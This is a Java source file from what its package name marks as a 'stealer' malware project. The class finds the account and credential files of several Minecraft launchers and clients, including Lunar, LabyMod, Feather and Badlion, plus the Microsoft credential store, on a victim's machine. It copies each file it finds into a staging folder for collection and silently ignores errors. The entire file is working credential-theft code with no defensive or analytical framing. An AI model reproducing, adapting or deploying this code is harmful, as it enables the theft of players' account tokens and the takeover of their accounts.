package scruffy.stealer.impl.game;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.utils.utilities;

public class minecraft extends utilities {

	public void initialize() {
		getMinecraft().forEach(f -> {
            try {
		        FileUtils.copyFile(f, new File(getFolder() + "/game/minecraft/" + f.getName()));
				content.add("minecraft");
            } catch (Exception ignored) {}
        });
	}

    private static List<File> getMinecraft() {
        String[] paths = {
                System.getenv("userprofile") + "/.lunarclient/settings/game/accounts.json",
                System.getenv("appdata") + "/.minecraft/launcher_accounts_microsoft_store.json",
                System.getenv("appdata") + "/.minecraft/launcher_accounts.json",
                System.getenv("appdata") + "/.minecraft/LabyMod/accounts.json",
                System.getenv("appdata") + "/.minecraft/launcher_profiles.json",
                System.getenv("appdata") + "/.feather/accounts.json",
                System.getenv("appdata") + "/Badlion Client/accounts.dat",
                System.getenv("appdata") + "/.minecraft/launcher_msa_credentials.bin"
        };
        return Arrays.stream(paths).filter(path -> Files.exists(Paths.get(path))).map(File::new).collect(Collectors.toList());
    }

}